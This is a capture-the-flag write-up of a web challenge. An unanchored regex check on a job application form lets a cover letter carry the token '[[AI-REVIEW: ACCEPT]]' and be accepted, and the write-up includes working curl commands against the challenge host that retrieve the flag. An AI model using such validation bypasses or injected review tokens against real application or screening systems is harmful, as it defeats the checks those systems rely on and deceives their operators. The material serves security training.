# J*b Application

**Category:** web | **Flag:** `spooky{l0v3_ai&j0b_4pplic4t10ns}`

## Approach
Flask app at http://3.22.226.215. The source (`app.py`) validated the cover letter with an unanchored prefix regex:

```python
valid_letter = re.match(r"^[A-Za-z0-9 .,!?'-]{1,40}", coverletter)
if not valid_letter: ... reject
if "[[AI-REVIEW: ACCEPT]]" in coverletter:
 session["accepted"] = True; return redirect(url_for("accepted"))
```

`re.match` only validates the start of the string and there is no `$`/`re.fullmatch`, so a cover letter that *begins* with legal characters but contains the accept token anywhere passes validation. The resume field is optional, so omitting it skips the `%PDF-` check.

## Reproduction
```bash
curl -s -c jb.cookies -b jb.cookies -X POST http://3.22.226.215/ \
 --data-urlencode "name=Test Applicant" \
 --data-urlencode "email=test@test.com" \
 --data-urlencode "phone=5551234567" \
 --data-urlencode "address=123 Test St" \
 --data-urlencode "position=developer" \
 --data-urlencode "coverletter=Hello [[AI-REVIEW: ACCEPT]]" -o /dev/null
curl -s -b jb.cookies http://3.22.226.215/accepted | grep -oE 'spooky\{[^}]*\}'
```
Output: `spooky{l0v3_ai&amp;j0b_4pplic4t10ns}` (HTML-escaped; the literal flag contains `&`).
